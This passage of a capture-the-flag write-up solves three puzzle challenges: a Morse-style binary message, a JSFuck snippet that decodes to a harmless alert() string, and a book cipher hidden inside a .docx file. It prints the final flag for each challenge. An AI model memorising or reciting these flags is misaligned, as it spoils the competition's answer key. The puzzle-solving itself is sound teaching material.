input the string:011 0000 1011 011 00 0100 0100 1011 111 001 1000 0 0100 111 111 101 00 10 110 0010 111 010 011 0000 01 1 00 000 10 111 1 11 00 000 000 00 10 110 0 11 111 000 00011 011 01 1011 0100 0110 11 00 000 0 000 010 11111 11 0010 1 1010 1010 1000 01 01 11 111 10 110 11 00 000 000 00 10 110 1 0000 00 10 110 000 111 010 100 111 1011 111 001 10 111 1 101 10 111 011 1 0000 01 1 00 1 011 00 0100 0100 0100 0 01 100 1 111 1011 111 001 0100 111 111 101 00 10 110 1 111 111 100 0 0 0110 0100 1011 01 10 100 011 00 100 0 0100 1011 0010 111 010 011 0000 01 1 000 0000 111 001 0100 100 10 111 1 1000 0 000 111 001 110 0000 1 0010 111 010 00 10 1 0000 0 0100 01 10 100 111 0010 1 0000 0 110 01 11 0
WHYWILLYOUBELOOKINGFORWHATISNOTMISSINGEMOS3WAYLPMISESR0MFTCCBAAMONGMISSINGTHINGSORDOYOUNOTKNOWTHATITWILLLEADTOYOULOOKINGTOODEEPLYANDWIDELYFORWHATSHOULDNOTBESOUGHTFORINTHELANDOFTHEGAME 
```

In clear format;

```
WHY WILL YOU BE LOOKING FOR WHAT IS NOT MISSING EMOS3WAYLPMISESR0MFTCCBA AMONG MISSING THINGS OR DO YOU NOT KNOW THAT IT WILL LEAD TO YOU LOOKING TOO DEEPLY AND WIDELY FOR WHAT SHOULD NOT BE SOUGHT FOR IN THE LAND OF THE GAME
```

A words is in reverse let fix that.

![image](https://user-images.githubusercontent.com/69868171/131212845-8efb5fc8-2a66-4269-a265-13458d10a13e.png)

We have the flag since we know the format it should be easy.

Final Flag:- `abcctf{m0rse_simply_aw3some}`

###  No-brainer  - 350 point

![image](https://user-images.githubusercontent.com/69868171/131212935-fcf8f17a-4dcc-47ba-843e-ceb39ddea4e4.png)

I wonder if they use their brains at all, or something else, man you talk to much let just hit it.

![image](https://user-images.githubusercontent.com/69868171/131212978-acabfe88-1bb4-4e71-ae9f-88fa39f3a3e5.png)

JsFuck it should be easy.

![image](https://user-images.githubusercontent.com/69868171/131213013-ca3a973f-e141-45c2-a744-a741fbe13bcc.png)

Decoding and we got `return"aler\164\50a\142\143\143\164f\173\102r\100in\137\167\110\101\164s\137u\120\175\51"` Definitely a javascript strings.

![image](https://user-images.githubusercontent.com/69868171/131213071-acd7dd90-25c4-4cd7-bc56-9f4ca55043fa.png)


Final Flag:- `abcctf{Br@in_wHAts_uP}`


###  Read read Read - 500 point

![image](https://user-images.githubusercontent.com/69868171/131259572-f3754f64-6eff-4bc1-8c95-e81eda1f3566.png)

Learning by books make sense

A docx file was given for this challenge, Given the word hint biblio (book) as the file name and the challenge title "read read read", had me thinking it might have been a book cipher.

My first attempt was to actually view the document as is, in it's .docx format. It turned out to be a one page document with multiple paragraphs whose content was basic, nothing special.

![image](https://user-images.githubusercontent.com/69868171/131259670-073881c8-c8c6-40b0-b1d3-54c50dd1de85.png)

So if this was truely a book cipher as suspected, i knew i needed some sort of key(s) to crack it. A quick note is that docx files are actually zip archives with a bunch of XMLs and all the attached media. I decided to pass it straight into cyberchef for unzipping and further analysis.

![image](https://user-images.githubusercontent.com/69868171/131259752-185ab612-2bb8-4e32-9a95-df806ccbd891.png)


With the help of cyberchef unzip tool, i was able to bake (extract) to reveal the underlying files which were xmls and rels files. Clicking through each file accordingly, i came across an interesting xml, "words/rel/rels.xml". Interesting because it had a PNG signature.

![image](https://user-images.githubusercontent.com/69868171/131259851-23dccc6f-6634-44d6-9428-f75fd43c7043.png)

I downloaded this file out of cyberchef's results then converted and opened it to reveal a 15 rows and 3 column digits as shown below;

![image](https://user-images.githubusercontent.com/69868171/131259910-c9e8d603-236c-4e36-a8ca-2d3cc1bfd471.png)

```
6 1 13
1 2 22
5 1 60
3 1 4 
4 3 10
1 2 2
8 4 2 
5 2 1
6 2 16
2 3 24
2 2 5
6 2 16
1 2 23
1 3 1
1 2 30
```

`Alas! The keys!!`

Next was to find out how this 3 parts keys fit into the book cipher as most book cipher consist majorly of 2 parts. But the major key here was making sure to have the word document opened in its original layout using office word ( software or online version) and not a text wrapping docx viewer in other to not mess up with the document line layout.

Since the docx had only 1 page, the first part of the key couldn't be page number so i decided to take it as paragraph number as there are only 8 paragraphs in the text and the highest key digit in the first column was 8 which made it fit perfectly.

For the second key part, it had to translate to line number to give us the perfect position to apply the third key.

The Final key was a bit confusing as it could either mean words count to choose first letter or letter count. I decided after seeing the greatest value of 60 that no paragraph had up to 60 words on them and then opted for the second option of letter count starting from the line number gotten from the second key part to reveal;

![image](https://user-images.githubusercontent.com/69868171/131260055-502421db-28d6-4f6f-a2af-deda22b1be73.png)

```
6 1 13 --- c
1 2 22 --- 1
5 1 60 --- P
3 1 4 --- h 
4 3 10 --- 3
1 2 2 --- r
8 4 2 --- f
5 2 1 ---R
6 2 16 ---0
2 3 24 ---m
2 2 5 --- b
6 2 16 --- 0 
1 2 23 --- 0
1 3 1 --- k
1 2 30 ---5
```

Since we know the flag format it shoukd be easy.

Final Flag:- `abcctf{c1Ph3r_fr0m_b00k5}`

The  Read read Read  Crypto challenge was only solve by our redqueen `AN3M0N1` feel free to connect with her on twitter with [Kaka Sheidu](https://twitter.com/KakaSheidu) or on Linkedln [Kaka Sheidu](https://www.linkedin.com/in/kaka-sheidu-101965139) .


Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
